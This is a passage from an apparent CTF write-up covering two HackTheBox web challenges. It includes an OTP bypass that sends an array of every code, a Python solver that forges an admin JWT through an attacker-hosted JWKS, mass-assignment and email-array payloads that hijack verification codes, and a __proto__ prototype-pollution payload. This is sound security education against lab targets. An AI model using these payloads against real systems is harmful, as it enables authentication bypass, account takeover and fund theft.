<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">rateLimiterMiddleware</span> = (<span class="params">limit = <span class="number">5</span>, windowInSeconds = <span class="number">60</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">async</span> (req, reply) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> userId = req.<span class="property">user</span>.<span class="property">email</span>;</span><br><span class="line">    <span class="keyword">const</span> redisKey = <span class="string">`rate-limit:<span class="subst">$&#123;userId&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> currentCount = <span class="keyword">await</span> <span class="title function_">hgetField</span>(redisKey, <span class="string">&#x27;count&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!currentCount) &#123;</span><br><span class="line">      currentCount = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">hsetField</span>(redisKey, <span class="string">&#x27;count&#x27;</span>, currentCount);</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">expireKey</span>(redisKey, windowInSeconds);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      currentCount = <span class="built_in">parseInt</span>(currentCount, <span class="number">10</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">hsetField</span>(redisKey, <span class="string">&#x27;count&#x27;</span>, currentCount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (currentCount &gt; limit) &#123;</span><br><span class="line">      reply.<span class="title function_">status</span>(<span class="number">429</span>).<span class="title function_">send</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Too many requests. Please try again later.&#x27;</span> &#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>So How can we bypassed the OTP? Take a look at this part in OTP middleware:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!otp.<span class="title function_">includes</span>(validOtp)) &#123;</span><br><span class="line">      reply.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid OTP.&#x27;</span> &#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>They use <code>includes(validOTP)</code> to check the OTP validity instead of direct comparing like <code>===</code>. Which if we take a peek at javascript documentation:</p>
<p><img src="https://hackmd.io/_uploads/HJAIoEJHJl.png" alt="image"></p>
<p>which means… we can send the otp in array with value from 0000 to 9999. This array will always contain one valid OTP. Below is the payload to used:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;to&quot;: &quot;aa@aa.com&quot;,</span><br><span class="line">    &quot;coin&quot;: &quot;CLCR&quot;,</span><br><span class="line">    &quot;amount&quot;: amount,</span><br><span class="line">    &quot;otp&quot;: [&quot;0000&quot;, &quot;0001&quot;, &quot;0002&quot;, ..., &quot;9998&quot;, &quot;9999&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>send it to <code>/api/crypto/transaction</code>, then access the dashboard, we will get the flag. Below is the full solver:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">API</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, webhook</span>):</span><br><span class="line">        <span class="variable language_">self</span>.url = url</span><br><span class="line">        <span class="variable language_">self</span>.c = httpx.Client()</span><br><span class="line">        <span class="variable language_">self</span>.webhook = webhook</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">self,</span>):</span><br><span class="line">        <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/api/auth/register&quot;</span>, json=&#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;aa@aa.com&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;aa&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak &quot;kid&quot; to forge jwt</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getkid</span>(<span class="params">self</span>):</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_rsa_keys</span>(<span class="params">self</span>):</span><br><span class="line">        ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_n_and_e</span>(<span class="params">self, public_key</span>):</span><br><span class="line">        ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">craftJWT</span>(<span class="params">self</span>):</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">accessDashboard</span>(<span class="params">self</span>):</span><br><span class="line">        r = <span class="variable language_">self</span>.c.get(<span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/api/dashboard&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> r.status_code == <span class="number">200</span>, r.json()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getBalance</span>(<span class="params">self</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.c.get(<span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/api/crypto/balance&quot;</span>).json()</span><br><span class="line">        clcr_balance = resp[<span class="number">0</span>][<span class="string">&#x27;availableBalance&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] admin clcr balance: &quot;</span>, clcr_balance)</span><br><span class="line">        <span class="keyword">return</span> clcr_balance</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateOTP</span>(<span class="params">self</span>):</span><br><span class="line">        otps = [<span class="string">f&quot;<span class="subst">&#123;num:04&#125;</span>&quot;</span> <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10000</span>)]</span><br><span class="line">        <span class="keyword">return</span> otps</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">transferBrutal</span>(<span class="params">self, amount</span>):</span><br><span class="line">        data = &#123; <span class="string">&quot;to&quot;</span>: <span class="string">&quot;aa@aa.com&quot;</span>, <span class="string">&quot;coin&quot;</span>: <span class="string">&quot;CLCR&quot;</span>, <span class="string">&quot;amount&quot;</span>: amount, <span class="string">&quot;otp&quot;</span>: <span class="variable language_">self</span>.generateOTP() &#125;</span><br><span class="line">        resp = <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/api/crypto/transaction&quot;</span>, json=data).json()</span><br><span class="line">        <span class="keyword">return</span> resp.get(<span class="string">&quot;success&quot;</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    webhook = <span class="built_in">input</span>(<span class="string">&quot;Enter your webhook: &quot;</span>)</span><br><span class="line">    api = API(<span class="string">&quot;http://localhost:1337&quot;</span>, webhook)</span><br><span class="line">    api.register()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># craft admin jwt</span></span><br><span class="line">    jwks = api.craftJWT()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] JWT crafted&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(api.c.headers[<span class="string">&#x27;Authorization&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    _ = <span class="built_in">input</span>(<span class="string">f&quot;set this jwks to your server, also set the content type to application/json\n<span class="subst">&#123;jwks&#125;</span>\nPress enter to continue&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if jwt with admin creds is valid</span></span><br><span class="line">    stat, _ = api.accessDashboard()</span><br><span class="line">    <span class="keyword">if</span> stat:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] JWT is valid, You are an admin now&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] JWT is invalid&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transfer all balance to user</span></span><br><span class="line">    balance = api.getBalance()</span><br><span class="line">    <span class="keyword">if</span> api.transferBrutal(balance):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Transfer success, admin balance is now 0, access dashboard&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get flag</span></span><br><span class="line">    stat, resp = api.accessDashboard()</span><br><span class="line">    flag = resp.get(<span class="string">&quot;flag&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>output:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Enter your webhook: https://webhook.site/ec0f6d63-7a4a-492e-8f5b-dbf6ca3a8c77</span><br><span class="line">[+] JWT crafted</span><br><span class="line">set this jwks to your server, also set the content type to application/json</span><br><span class="line">&#123;&quot;keys&quot;: [&#123;&quot;alg&quot;: &quot;RS256&quot;, &quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;063c81d6-99ec-43c4-8789-40337951bf4d&quot;, &quot;use&quot;: &quot;sig&quot;, &quot;n&quot;: &quot;vJnSJ2YrFIFGI6VFCMhF4rC6II2P5lZDoiw5xDWjtT20QiWHV_uN1U1oWolCVvRDW5w3woYl9Lti9vISysgKMG6vwhlsjBPHiM_EzNJNP_xyRcqtO1-r8VagSS_qDFiq9ZvByTe0vN-i_lKA2L2DxActlZOuro8YJeNqW06j2WN9UDiT-SZrmTGnAG00-q73fridekqbiDK4FiF1KUuWgFiTa3uqHKQGMFPuLTCxlfdOfPgXXBWT7FWbOz1P5VFiSfuDw5pdVUIcF_-JnGb-ThT-8caf8dU8bWBGPsaFhHxBNDloEaQZHrk46TEMaED1_s78gM6Di2oOxf1ULgX_Lw&quot;&#125;]&#125;</span><br><span class="line">Press enter to continue</span><br><span class="line">[+] JWT is valid, You are an admin now</span><br><span class="line">[+] admin clcr balance:  24698894988</span><br><span class="line">[+] Transfer success, admin balance is now 0, access dashboard</span><br><span class="line">[+] Flag: HTB&#123;f4k3_fl4g_f0r_t35t1ng&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Web-Intergalactic-Bounty"><a href="#Web-Intergalactic-Bounty" class="headerlink" title="Web Intergalactic Bounty"></a>Web Intergalactic Bounty</h2><blockquote>
<p>Difficulity: <strong>Hard</strong></p>
</blockquote>
<h3 id="Vulnerability-2"><a href="#Vulnerability-2" class="headerlink" title="Vulnerability:"></a>Vulnerability:</h3><ul>
<li>Server-Side Prototype Pollution</li>
<li>Mishandled Email Parser</li>
<li>Local File Inclusion</li>
<li>Cross Site Scripting</li>
<li>Server-Side Request Forgery</li>
<li>Denial of Services</li>
<li>Mass Assignment</li>
</ul>
<h3 id="Challenge-Introduction-1"><a href="#Challenge-Introduction-1" class="headerlink" title="Challenge Introduction"></a>Challenge Introduction</h3><p>This challenge was intended to be solved by exploiting the 0-day in email-address npm package. We solved it using unintended way and didn’t use the 0-day approach.</p>
<p>Given a web with these functionalities:</p>
<ul>
<li>Register</li>
<li>Login</li>
<li>Send and Resend Verification Code</li>
<li>Make, Edit, and View Bounty</li>
<li>Report a Bounty</li>
<li>Visit a link</li>
</ul>
<h3 id="Get-Admin-Access"><a href="#Get-Admin-Access" class="headerlink" title="Get Admin Access"></a>Get Admin Access</h3><p>To access any endpoints in the website, we need to have an authorized account, the problem is, the application only allow us to register using <code>[any]@interstellar.htb</code>. Below is the code that represent the restriction:</p>
<p>&#x2F;controllers&#x2F;authControllers.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">registerAPI</span> = <span class="keyword">async</span> (<span class="params">req, res</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; email, password, role = <span class="string">&quot;guest&quot;</span> &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> emailDomain = emailAddresses.<span class="title function_">parseOneAddress</span>(email)?.<span class="property">domain</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!emailDomain || emailDomain !== <span class="string">&#x27;interstellar.htb&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Registration is not allowed for this email domain&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">createUser</span>(email, password, role);</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;User registered. Verification email sent.&quot;</span>, <span class="attr">status</span>: <span class="number">201</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: err.<span class="property">message</span>, <span class="attr">status</span>: <span class="number">500</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>we try to stack the email like:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test@email.htb &lt;&quot;gedagedi@interstellar.htb&quot;&gt;</span><br><span class="line">test@email.htb.interstellar.htb</span><br><span class="line">etc...</span><br></pre></td></tr></table></figure>

<p>But it didn’t give any green lamp. At this point we almost believe that we <strong>must</strong> solve this challenge by exploiting a 0-day. But we tried to observe more, maybe there’s another vector that we can use to register. Knowing there’s a resend verify code functionality, we thought: </p>
<blockquote>
<p><em>“Can we register with a valid user, then resend the code to email we control (<a href="mailto:&#x74;&#101;&#115;&#x74;&#64;&#101;&#x6d;&#97;&#x69;&#x6c;&#46;&#104;&#116;&#x62;">test@email.htb</a>)?”</em></p>
</blockquote>
<p>Below is detailed tactic:</p>
<ol>
<li>Register as <code>[someone]@interstellar.htb</code></li>
<li>resend verification code to <code>[&quot;[someone]@interstellar.htb&quot;, &quot;test@email.htb&quot;]</code></li>
<li>Get the <code>[someone]@interstellar.htb</code> verification code in <a href="mailto:&#116;&#101;&#x73;&#116;&#x40;&#101;&#x6d;&#x61;&#105;&#108;&#46;&#104;&#x74;&#x62;">test@email.htb</a> mailbox</li>
</ol>
<p>Because if we take a look at the nodemailer sendMail mail options structure, we can use array of target addresses.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface <span class="title class_">Options</span> &#123;</span><br><span class="line">        <span class="comment">/** The e-mail address of the sender. All e-mail addresses can be plain &#x27;sender<span class="doctag">@server</span>.com&#x27; or formatted &#x27;Sender Name &lt;sender<span class="doctag">@server</span>.com&gt;&#x27; */</span></span><br><span class="line">        <span class="keyword">from</span>?: string | <span class="title class_">Address</span> | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">/** An e-mail address that will appear on the Sender: field */</span></span><br><span class="line">        sender?: string | <span class="title class_">Address</span> | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">/** Comma separated list or an array of recipients e-mail addresses that will appear on the To: field */</span></span><br><span class="line">        to?: string | <span class="title class_">Address</span> | <span class="title class_">Array</span>&lt;string | <span class="title class_">Address</span>&gt; | <span class="literal">undefined</span>;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>We was kinda skeptical on sequelize because we think that findOne will only accept a single string. But surprisingly findOne accepts array as it’s argument. We also can laverage out privillege as admin by adding <code>role: admin</code> parameter in the register payload, which is a mass assignment vulnerability. Below is our payload to register as a valid user that has admin privillage:</p>
<p>register:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;email&quot;: &quot;kutikula@interstellar.htb&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;aa&quot;,</span><br><span class="line">    &quot;role&quot;: &quot;admin&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>resend verif code:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;email&quot;:</span><br><span class="line">        [</span><br><span class="line">            &quot;kutikula@interstellar.htb&quot;,</span><br><span class="line">            &quot;test@email.htb&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>verif code in <a href="mailto:&#116;&#x65;&#115;&#116;&#64;&#x65;&#109;&#x61;&#105;&#x6c;&#x2e;&#x68;&#x74;&#98;">test@email.htb</a> mailbox:<br><img src="https://hackmd.io/_uploads/HkV4telBJe.png" alt="image"></p>
<p>submit verification code for valid user</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;email&quot;:&quot;kutikula@interstellar.htb&quot;,</span><br><span class="line">    &quot;code&quot;:&quot;2b176b816ce9830a5a1a8b7200f328da&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Now we can login as <code>kutikula@interstellar.htb</code>.</p>
<h3 id="Server-Side-Prototype-Pollution-leads-to-Local-File-Inclusion"><a href="#Server-Side-Prototype-Pollution-leads-to-Local-File-Inclusion" class="headerlink" title="Server-Side Prototype Pollution leads to Local File Inclusion"></a>Server-Side Prototype Pollution leads to Local File Inclusion</h3><p>By gaining the admin privillege, we can access more endpoints, such as:</p>
<ul>
<li>Edit Bounties</li>
<li>Transmit URLs to admin</li>
</ul>
<p>In edit bounties functionallity, we can edit any fields in the bounty, merge the existed bounty properties value with the one supplied by the editor, then update the data to database. The object merge function used by the app can be seen below:</p>
<p>mergedeep&#x2F;src&#x2F;index.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = item =&gt; item &amp;&amp; <span class="keyword">typeof</span> item === <span class="string">&quot;object&quot;</span> &amp;&amp; !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(item) &amp;&amp; item !== <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mergeDeep</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_">isObject</span>(target) &amp;&amp; <span class="title function_">isObject</span>(source)) &#123;</span><br><span class="line">		<span class="title class_">Object</span>.<span class="title function_">keys</span>(source).<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_">isObject</span>(source[key])) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!target[key]) &#123;</span><br><span class="line">					<span class="title class_">Object</span>.<span class="title function_">assign</span>(target, &#123;[key]: &#123;&#125;&#125;);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="title function_">mergeDeep</span>(target[key], source[key]);</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(source[key])) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!target[key]) &#123;</span><br><span class="line">					target[key] = [];</span><br><span class="line">				&#125;</span><br><span class="line">				target[key] = [...target[key], ...source[key]];</span><br><span class="line">				<span class="title function_">mergeDeep</span>(target[key], source[key]);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="title class_">Object</span>.<span class="title function_">assign</span>(target, &#123;[key]: source[key]&#125;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>it recursively set the properties object with from source object. There’s no restriction or whatsoever to protect the mechanism from allowing attacker to write properties in the global object prototype. Below is example how can we write any properties in global object:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;__proto__&quot;:&#123;</span><br><span class="line">    &quot;properties&quot;: &quot;hijacked&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>But directly sending that payload for updating the bounty will return us an error from sequalize:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2024-12-18 16:19:33 TypeError: this._customSetters[key].call is not a function</span><br><span class="line">2024-12-18 16:19:33     at model.set (/app/node_modules/sequelize/lib/model.js:2256:32)</span><br><span class="line">2024-12-18 16:19:33     at model.set (/app/node_modules/sequelize/lib/model.js:2241:18)</span><br><span class="line">2024-12-18 16:19:33     at model.update (/app/node_modules/sequelize/lib/model.js:2591:10)</span><br><span class="line">2024-12-18 16:19:33     at editBountiesAPI (/app/controllers/bountyController.js:114:16)</span><br></pre></td></tr></table></figure>

<p>the error coming from sequalize, upon searching for clues, we find this <a target="_blank" rel="noopener" href="https://stefanin.com/posts/heroctf_complainio/">writeup</a>. we can bypass the error by setting the fields array to empty sizea, and setting “attributes” to a valid one.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;__proto__&quot;:&#123;</span><br><span class="line">    &quot;fields&quot;: [],</span><br><span class="line">    &quot;attributes&quot;: [&quot;id&quot;, &quot;email&quot;, &quot;isVerified&quot;, &quot;role&quot;],</span><br><span class="line">    &quot;bad_prop&quot;: &quot;hijacked&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Now we need to find a gadget to either trigger RCE or read the flag. In our case, we found out that we can set an attachment to when we send mail using nodemailer.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">interface <span class="title class_">Options</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        attachments?: <span class="title class_">Attachment</span>[] | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">/** An array of alternative text contents (in addition to text and html parts) */</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">interface <span class="title class_">Attachment</span> <span class="keyword">extends</span> <span class="title class_">AttachmentLike</span> &#123;</span><br><span class="line">        <span class="comment">/** filename to be reported as the name of the attached file, use of unicode is allowed. If you do not want to use a filename, set this value as false, otherwise a filename is generated automatically */</span></span><br><span class="line">        filename?: string | <span class="literal">false</span> | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">/** optional content id for using inline images in HTML message source. Using cid sets the default contentDisposition to &#x27;inline&#x27; and moves the attachment into a multipart/related mime node, so use it only if you actually want to use this attachment as an embedded image */</span></span><br><span class="line">        cid?: string | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">/** If set and content is string, then encodes the content to a Buffer using the specified encoding. Example values: base64, hex, binary etc. Useful if you want to use binary attachments in a JSON formatted e-mail object */</span></span><br><span class="line">        encoding?: string | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">/** optional content type for the attachment, if not set will be derived from the filename property */</span></span><br><span class="line">        contentType?: string | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">/** optional transfer encoding for the attachment, if not set it will be derived from the contentType property. Example values: quoted-printable, base64. If it is unset then base64 encoding is used for the attachment. If it is set to false then previous default applies (base64 for most, 7bit for text). */</span></span><br><span class="line">        contentTransferEncoding?: <span class="string">&quot;7bit&quot;</span> 